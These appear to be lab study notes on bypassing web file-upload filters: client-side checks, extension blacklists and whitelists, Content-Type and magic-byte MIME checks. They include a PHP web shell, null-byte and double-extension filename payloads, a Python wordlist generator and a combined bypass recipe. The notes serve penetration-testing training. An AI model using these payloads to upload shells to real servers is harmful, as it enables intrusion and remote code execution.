---

# Client-Side Validation

---

## 1-Client-Side Validation
Many web apps only validate file types in front-end JavaScript (e.g., allow images only). Client-side checks are trivial to bypass because the browser executes that code , an attacker can skip or change it by talking directly to the server or by modifying the page in the browser dev tools.

The example shows a **Profile Image** upload that limits the file selector to images. Selecting a non-image triggers an error (`Only images are allowed!`) and disables the Upload button. The page never refreshes or sends a request when the file is selected, indicating the validation is purely client-side. If the server doesn’t re-validate uploads, an attacker can bypass these protections.
#### Back-end Request Modification
Capture the normal image upload request (e.g., with Burp) and observe the multipart parts: the `filename="HTB.png"` field and the file content. By modifying the captured request — changing the `filename` to `shell.php` and replacing the content with a PHP web shell — you can upload a script despite client-side restrictions. If the server accepts it and returns `File successfully uploaded`, visiting the uploaded file executes the code and can give RCE.
![[Pasted image 20251111200637.png]]
#### Disabling Front-end Validation
![[Pasted image 20251111200734.png]]
Because client-side code runs in your browser you can directly alter it:

- Inspect the file input and find `onchange="checkFile(this)"` and `accept=".jpg,.jpeg,.png"`.
- Reveal the `checkFile` function in the console; it checks the extension and disables the submit button when the extension isn't allowed.
- Remove the `checkFile` handler or the `accept` attribute in the inspector (temporary change in your browser). After that you can pick and upload a `.php` file normally.
Example HTML line before:
```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

After removing the `onchange`, the client-side block is disabled and upload proceeds.


---

## 2- Blacklist Filters

In the previous section we bypassed client-side checks. Back-end validation is essential because attackers can’t directly modify server-side code. However, poorly implemented back-end checks (like blacklists) can still be bypassed, allowing PHP file uploads.
#### Blacklisting Extensions

A common but weak back-end approach is to check the uploaded file’s extension against a **blacklist** of disallowed types. Example (PHP):
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```
this is brittle because the blacklist is rarely comprehensive, can be case-sensitive, and may omit extensions that the server treats as executable. Mixed-case extensions (e.g., `pHp`) or alternative extensions may bypass the check and still execute as PHP on the server.
#### Fuzzing Extensions
When a blacklist blocks direct uploads, fuzz the upload endpoint to discover which extensions are _not_ blocked. Use extension lists from resources `PayloadsAllTheThings` provides lists of extensions for [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) and [.NET](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) web applications. We may also use `SecLists` list of common [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt).
![[Pasted image 20251113213650.png]]
- Capture a normal upload request and send it to an attack tool.
- Replace the extension in the `filename` field with each candidate from your list while keeping the file content unchanged.
- Look for responses that differ from the “Extension not allowed” error — successful responses indicate allowed extensions.
Sort results by response length or status to quickly spot candidates that likely passed validation.
![[Pasted image 20251113213655.png]]
#### Non-Blacklisted Extensions
Once you find a non-blacklisted extension, upload the same payload but change the file content to a PHP web shell. Some extensions commonly allowed by misconfigured servers include `.phtml`, `.php3`, `.php4`, `.inc`, or others depending on the server configuration.

Example: using `.phtml` and uploading a web shell, then visiting:
```bash
http://SERVER_IP:PORT/profile_images/shell.phtml?cmd=id
```
If the server executes PHP for that extension, the command output confirms successful bypass of the blacklist and remote code execution.
> Not every non-blacklisted extension will execute code on every server , execution depends on the web server’s PHP handler configuration. Therefore, try multiple candidate extensions and verify execution by uploading a test script that produces observable output.


---


## 3- Whitelist Filters
A whitelist of allowed extensions is generally more secure than a blacklist because the server only permits explicitly listed file types. Whitelists are common when uploads should be limited to a few safe types (e.g., images). However, incorrect implementations (especially bad regexes or server misconfigurations) still allow bypasses that lead to arbitrary uploads and code execution.

#### Whitelisting Extensions

A common mistake is using a regex that checks whether the filename _contains_ an allowed extension instead of ensuring it _ends_ with that extension. Example of a flawed check:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

This pattern only looks for the presence of the extensions anywhere in the filename and not necessarily at the end. Because of that, attackers can craft filenames that contain an allowed extension but still end with a dangerous one.

#### Double Extensions
```bash
shell.jpg.php
```
A straightforward bypass of the weak regex is using **double extensions**. For example, `shell.jpg.php` contains `.jpg` (so it passes the naive `contains` check) but ends in `.php`, which may be executed by the server. Intercept the upload, change the filename to `shell.jpg.php`, set the content to a PHP web shell, upload, then visit the uploaded file to confirm execution.

Note: a correctly written regex that enforces the extension at the end — e.g. `if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName))` — will block double-extension tricks because it matches only the final extension.

#### Reverse Double Extension 
```bash
shell.php.jpg
```
Even when the app’s whitelist enforces the final extension correctly, the web server configuration may itself be vulnerable. Example Apache `FilesMatch` that enables PHP for several extensions:

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

If the server-side regex or configuration is not anchored properly, any filename _containing_ `.php` (not just ending with it) might be handled as PHP. In that case, `shell.php.jpg` (which ends with `.jpg` so it passes the app whitelist) can still be treated as PHP by the webserver and execute code. This is why both application-level and server-level validations must be correct.

#### Character Injection

Character injection can trick the server or application into misinterpreting the filename. Common injections to try around extensions include:
- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

Examples:
- `shell.php%00.jpg` — with older PHP versions this truncates at the null byte and stores as `shell.php` while the app sees `.jpg`.
- `shell.aspx:.jpg` — on some Windows setups this can write the file as `shell.aspx`.

A simple generator to create permutations for fuzzing:
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

Use the generated list with a fuzzing tool (Burp Intruder, etc.) to find filenames that pass the whitelist but result in server-side execution.
### auto script (use the above 3 method)

```bash
#!/usr/bin/env python3
"""
gen_upload_wordlist.py
Generate a wordlist of filenames for upload fuzzing that combines:
 - double extensions (e.g. shell.jpg.php)
 - reverse double extensions (e.g. shell.php.jpg)
 - character injection permutations (e.g. shell.php%00.jpg, shell.jpg%20.php, ...)
Usage:
    python3 gen_upload_wordlist.py -o wordlist.txt
"""

import argparse
from itertools import product

def build_wordlist(basenames, php_exts, image_exts, inject_chars, uniq=True):
    out = []
    # Plain double / reverse double (no injection)
    for base, php, img in product(basenames, php_exts, image_exts):
        # ensure dots in extensions (they may include leading dot)
        php_e = php if php.startswith('.') else '.'+php
        img_e = img if img.startswith('.') else '.'+img
        out.append(f"{base}{img_e}{php_e}")   # double: shell.jpg.php
        out.append(f"{base}{php_e}{img_e}")   # reverse double: shell.php.jpg

    # Character injection permutations
    for base, php, img, ch in product(basenames, php_exts, image_exts, inject_chars):
        php_e = php if php.startswith('.') else '.'+php
        img_e = img if img.startswith('.') else '.'+img
        # Four insertion positions (like earlier examples)
        out.append(f"{base}{ch}{php_e}{img_e}")   # shell%00.php.jpg
        out.append(f"{base}{php_e}{ch}{img_e}")   # shell.php%00.jpg
        out.append(f"{base}{img_e}{ch}{php_e}")   # shell.jpg%00.php
        out.append(f"{base}{img_e}{php_e}{ch}")   # shell.jpg.php%00

    # Optional: add bare php extensions too (shell.php)
    for base, php in product(basenames, php_exts):
        php_e = php if php.startswith('.') else '.'+php
        out.append(f"{base}{php_e}")

    if uniq:
        # preserve order but deduplicate
        seen = set()
        dedup = []
        for x in out:
            if x not in seen:
                dedup.append(x)
                seen.add(x)
        return dedup
    return out

def main():
    parser = argparse.ArgumentParser(description="Generate upload filename permutations")
    parser.add_argument('-o','--output', default='wordlist.txt', help='output filename')
    parser.add_argument('-b','--base', default='shell', help='comma-separated basenames (default: shell)')
    parser.add_argument('--php-exts', default='.php,.php3,.php4,.php5,.php7,.php8,.pht,.phar,.phpt,.pgif,.phtml,.phtm',
                        help='comma-separated php extensions (with or without leading dot)')
    parser.add_argument('--img-exts', default='jpg,jpeg,png,gif',
                        help='comma-separated allowed/whitelisted image extensions to pair with')
    parser.add_argument('--chars', default="%20,%0a,%00,%0d0a,/,.\\,.,…,:", 
                        help='comma-separated injection characters (some may need escaping in shells)')
    parser.add_argument('--no-bare-php', action='store_true', help='do not include bare php (shell.php) entries')
    args = parser.parse_args()

    basenames = [b.strip() for b in args.base.split(',') if b.strip()]
    php_exts = [p.strip() for p in args.php_exts.split(',') if p.strip()]
    image_exts = [i.strip() for i in args.img_exts.split(',') if i.strip()]
    inject_chars = [c for c in (ch.strip() for ch in args.chars.split(',')) if c != '']

    wordlist = build_wordlist(basenames, php_exts, image_exts, inject_chars, uniq=True)

    if args.no_bare_php:
        # remove plain base+php entries
        filtered = [w for w in wordlist if not any(w.endswith((ext if ext.startswith('.') else '.'+ext)) for ext in php_exts)]
        wordlist = filtered

    with open(args.output, 'w', encoding='utf-8') as f:
        for line in wordlist:
            f.write(line + '\n')

    print(f"[+] Generated {len(wordlist):,} entries -> {args.output}")

if __name__ == '__main__':
    main()

```


---
## 4- Type Filters
Type filters validate the _content_ of an uploaded file, not just its extension. Since attackers can bypass extension filters with tricks like `shell.php.jpg`, modern applications also verify whether the uploaded file _actually_ matches the expected type (image, video, document, etc.). Content validation commonly relies on:

- **Content-Type header** (client-controlled)
- **MIME-Type / Magic bytes** (server-side detection based on file signature)

Both of these can still be bypassed depending on how the application implements validation.
#### Content-Type

If uploading a script fails regardless of the filename or extension tricks (e.g., `.php.jpg`, `.jpg.phtml`, etc.), the application is likely validating the **Content-Type header**.

Example of a weak PHP validation:
```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```
Browsers set this header automatically, but it can be modified using a proxy like Burp Suite. By changing the file’s **Content-Type** header to an allowed type (e.g. `image/jpg`), the filter can be bypassed even if the file is actually a PHP script.

- Intercept the upload request.
- Modify the file’s `Content-Type` header to an image type.
![[Pasted image 20251113232421.png]]
- Upload succeeds.
- Visiting the file (e.g., `shell.php?cmd=id`) allows command execution.
```bash
http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
```
**Important:** File uploads contain two Content-Type headers:

- One for the multipart request itself.
- One for the uploaded file.  
    You usually modify the file’s Content-Type header.

#### MIME-Type
```bash
GIF8
```
MIME-Type validation checks the file’s **actual content** using its signature or "magic bytes." This is more secure since it examines the _file itself_, not the header sent by the client.

Examples:
- GIF files begin with: `GIF87a` or `GIF89a` `GIF8`
- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Changing these first bytes alters the detected MIME type.
```bash
echo "GIF8" > text.jpg
file text.jpg # gif 
```
The file now appears as a GIF image, despite being arbitrary content.

Example PHP MIME-type validation:
```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

To bypass:

```bash
 echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
- Prepend `GIF8` to your PHP shell.
- Keep the extension `.php` so the server still executes PHP.
- MIME-type becomes `image/gif`, allowing the file to pass validation.
When executed, you see `GIF8` print before PHP output — the magic bytes are treated as plaintext.
![[Pasted image 20251113232702.png]]
```bash
http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
```
**Combining Techniques**
More hardened filters may validate:
- Extension
- Content-Type header
- MIME-type
By mixing different allowed/disallowed combinations, you may bypass layered filters.
Examples of combos that sometimes bypass flawed implementations:
- **Allowed MIME-Type + Disallowed Content-Type**
- **Allowed Content-Type + Disallowed Extension**
- **Allowed Extension + Disallowed MIME-Type**
- **Fake GIF signature + PHP extension**
- **Content-Type fuzzing + MIME spoofing**


---

##  1+2+3+4 BYPASS  ALL FILTER IN ONE 

**Bypass Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type**
![[Pasted image 20251113233613.png]]
```bash
# filename="shell.png.phar" ------------> bypass (whitelist + the blacklist)
# Content-Type: image/png ---------> bypass the content-type 

# GIF8 ----------------------------> bypass MIME
# <?php system($_GET["cmd"]); ?> -----> shell
```


---
